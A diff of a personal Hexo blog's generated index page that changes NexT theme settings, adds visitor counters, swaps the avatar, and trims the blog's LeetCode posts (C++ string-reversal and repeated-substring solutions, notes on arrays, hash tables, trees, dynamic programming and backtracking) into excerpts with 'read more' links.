@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":30,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":30,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta property="og:type" content="website">
@@ -171,10 +171,8 @@
     </header>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
 
     <main class="main">
@@ -191,7 +189,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E5%AD%97%E7%AC%A6%E4%B8%B2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -213,10 +211,17 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-09-28 20:53:23 / 修改时间：20:54:15" itemprop="dateCreated datePublished" datetime="2024-09-28T20:53:23+08:00">2024-09-28</time>
+              <time title="创建时间：2024-09-28 20:53:23 / 修改时间：21:25:50" itemprop="dateCreated datePublished" datetime="2024-09-28T20:53:23+08:00">2024-09-28</time>
             </span>
 
           
+            <span id="/2024/09/28/%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-meta-item leancloud_visitors" data-flag-title="字符串" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -243,23 +248,406 @@
       
           <h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h4 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/reverse-string/">344. 反转字符串</a></h4><p>最简单的一题,用双指针操作就行</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(vector&lt;<span class="keyword">char</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> temp;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            temp = s[i];</span><br><span class="line">            s[i] = s[j];</span><br><span class="line">            s[j] = temp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E5%AD%97%E7%AC%A6%E4%B8%B2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E6%95%B0%E7%BB%84/">
 
-<h4 id="541-反转字符串-II"><a href="#541-反转字符串-II" class="headerlink" title="541. 反转字符串 II"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/reverse-string-ii/">541. 反转字符串 II</a></h4><p>本题对反转字符串有了新的规则</p>
-<p>打破一个传统思想:字符串并不一定要逐个遍历其中的字符,也可以跳着遍历</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">reverseStr</span><span class="params">(string s, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">int</span> end = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">2</span> * k) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i + k &lt; n) &#123;</span><br><span class="line">                <span class="comment">//判断剩下的够不够k个</span></span><br><span class="line">                <span class="built_in">myReverse</span>(s, i, i + k - <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">myReverse</span>(s, i, n - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">myReverse</span><span class="params">(string&amp; s, <span class="keyword">int</span> begin, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = begin;</span><br><span class="line">        <span class="keyword">int</span> j = end; <span class="comment">// 下标</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(s[i], s[j]);</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
 
-<h4 id="151-反转字符串中的单词"><a href="#151-反转字符串中的单词" class="headerlink" title="151. 反转字符串中的单词"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/reverse-words-in-a-string/">151. 反转字符串中的单词</a></h4><p>本题有两个关键点</p>
-<ol>
-<li>消去不合法空格的处理逻辑</li>
-<li>对合法字符串整体反转,再对每个单词进行翻转,就得到了反着的句子</li>
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/28/%E6%95%B0%E7%BB%84/" class="post-title-link" itemprop="url">数组</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-28 20:53:10 / 修改时间：21:25:23" itemprop="dateCreated datePublished" datetime="2024-09-28T20:53:10+08:00">2024-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2024/09/28/%E6%95%B0%E7%BB%84/" class="post-meta-item leancloud_visitors" data-flag-title="数组" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/09/28/%E6%95%B0%E7%BB%84/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/28/%E6%95%B0%E7%BB%84/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h4 id="209-长度最小的子数组"><a href="#209-长度最小的子数组" class="headerlink" title="209. 长度最小的子数组"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度最小的子数组</a></h4><p>思路：这道题的要求是连续的子数组大于等于target</p>
+<p>采用滑动窗口(像蛇一样蠕动前行)的思想</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E6%95%B0%E7%BB%84/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/" class="post-title-link" itemprop="url">哈希表</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-28 20:53:06 / 修改时间：21:25:31" itemprop="dateCreated datePublished" datetime="2024-09-28T20:53:06+08:00">2024-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/" class="post-meta-item leancloud_visitors" data-flag-title="哈希表" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><h4 id="242-有效的字母异位词"><a href="#242-有效的字母异位词" class="headerlink" title="242. 有效的字母异位词"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/valid-anagram/">242. 有效的字母异位词</a></h4><p>思路：采用数组当做哈希表</p>
+<p>其中可以巧妙利用字母减’a’讲其变为从0开始的int类型的变量</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E5%93%88%E5%B8%8C%E8%A1%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/" class="post-title-link" itemprop="url">二叉树</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-28 20:53:00 / 修改时间：21:25:38" itemprop="dateCreated datePublished" datetime="2024-09-28T20:53:00+08:00">2024-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/" class="post-meta-item leancloud_visitors" data-flag-title="二叉树" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><h3 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h3><h4 id="144-二叉树的前序遍历"><a href="#144-二叉树的前序遍历" class="headerlink" title="144. 二叉树的前序遍历"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/binary-tree-preorder-traversal/">144. 二叉树的前序遍历</a></h4>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E4%BA%8C%E5%8F%89%E6%A0%91/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/luoqixi.png">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" class="post-title-link" itemprop="url">动态规划</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-09-28 20:52:55 / 修改时间：21:25:45" itemprop="dateCreated datePublished" datetime="2024-09-28T20:52:55+08:00">2024-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" class="post-meta-item leancloud_visitors" data-flag-title="动态规划" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h3 id="动态规划题目的分类"><a href="#动态规划题目的分类" class="headerlink" title="动态规划题目的分类"></a>动态规划题目的分类</h3><ol>
+<li>背包问题</li>
+<li>打家劫舍</li>
+<li>股票问题</li>
+<li>子序列问题</li>
 </ol>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">int</span> flag = <span class="number">0</span>;<span class="comment">//flag用于标识是否遍历到第一个字符用于消去字符串前置空格</span></span><br><span class="line">        string temp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (flag != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; s[i + <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                        temp += s[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">                temp += s[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// temp就是去掉不合法空格之后的s</span></span><br><span class="line">        <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>(), temp.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; temp.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">//反转每个单词    (这里的reverse是左闭右开)</span></span><br><span class="line">                <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>() + start, temp.<span class="built_in">begin</span>() + i);</span><br><span class="line">                <span class="comment">//记录下一个单词的开始位置</span></span><br><span class="line">                start = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//因为前面检测的是空格,所以最后有可能会剩一个单词,单独处理一下它的反转</span></span><br><span class="line">        <span class="keyword">if</span>(start&lt;n)&#123;</span><br><span class="line">            <span class="built_in">reverse</span>(temp.<span class="built_in">begin</span>() + start, temp.<span class="built_in">end</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="459-重复的子字符串"><a href="#459-重复的子字符串" class="headerlink" title="459. 重复的子字符串"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/repeated-substring-pattern/">459. 重复的子字符串</a></h4><h5 id="暴力解法"><a href="#暴力解法" class="headerlink" title="暴力解法"></a>暴力解法</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> res = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// i获取子串结束位置</span></span><br><span class="line">            <span class="keyword">int</span> len = i - <span class="number">0</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> k = <span class="number">1</span>;<span class="comment">//k表示当前循环了几个子串的长度,并用于后面计算j和子串之间的位置关系</span></span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">//用于计数以更新k</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; s.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == s[j - k * len]) &#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    <span class="keyword">if</span> (count % len == <span class="number">0</span>) &#123;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">if</span> (j == s.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                            res = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//重新选子串</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h5 id="kmp解法"><a href="#kmp解法" class="headerlink" title="kmp解法"></a>kmp解法</h5>
+<h3 id="做动态规划类题目需要注意的问题-五部曲"><a href="#做动态规划类题目需要注意的问题-五部曲" class="headerlink" title="做动态规划类题目需要注意的问题(五部曲)"></a>做动态规划类题目需要注意的问题(五部曲)</h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -281,7 +669,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E5%9B%9E%E6%BA%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -316,6 +704,13 @@
             </span>
 
           
+            <span id="/2024/09/28/%E5%9B%9E%E6%BA%AF/" class="post-meta-item leancloud_visitors" data-flag-title="回溯" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -342,88 +737,114 @@
       
           <h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><h2 id="回溯算法能解决的问题"><a href="#回溯算法能解决的问题" class="headerlink" title="回溯算法能解决的问题"></a>回溯算法能解决的问题</h2><p>排列组合</p>
 <p>分割</p>
-<p>棋盘</p>
-<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(参数)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(收获结果的条件)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>()&#123;</span><br><span class="line">        压栈</span><br><span class="line">        递归调用</span><br><span class="line">        回溯</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/28/%E5%9B%9E%E6%BA%AF/#more" rel="contents">
